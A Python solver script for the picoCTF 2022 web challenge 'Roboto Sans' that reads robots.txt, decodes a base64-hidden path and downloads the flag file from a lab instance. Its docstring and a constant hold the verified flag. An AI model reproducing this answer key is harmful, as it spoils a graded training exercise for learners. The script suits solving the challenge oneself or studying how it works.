#!/usr/bin/env python3
"""Solver for Challenge 291 Roboto Sans (picoCTF 2022, Web Exploitation).

Chain: /robots.txt lists base64 path anMvbXlmaWxlLnR4dA== (= js/myfile.txt);
flag1.txt is a rabbit hole. GET /js/myfile.txt -> flag.

Lab is on-demand (PUT /api/challenges/291/instance/); URL rotates.
Usage: solve_291_roboto_sans.py [base_url]
Verified: academy{Who_D03sN7_L1k5_90B0T5_662b27d3} (POST /api/submissions/ -> correct:true)
"""
import base64
import sys
import urllib.request

EXPECTED = "academy{Who_D03sN7_L1k5_90B0T5_662b27d3}"


def solve(base: str) -> str:
    base = base.rstrip("/") + "/"
    robots = urllib.request.urlopen(base + "robots.txt", timeout=20).read().decode()
    print(robots[:300])
    assert base64.b64decode("anMvbXlmaWxlLnR4dA==").decode() == "js/myfile.txt"
    flag = urllib.request.urlopen(base + "js/myfile.txt", timeout=20).read().decode().strip()
    print(flag)
    return flag


if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "http://xebec.cylabacademy.net:49117/"))
